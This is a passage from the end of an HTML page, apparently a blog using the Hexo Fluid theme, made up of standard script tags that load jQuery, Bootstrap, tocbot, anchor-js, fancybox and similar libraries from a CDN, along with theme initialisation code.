    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>







  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
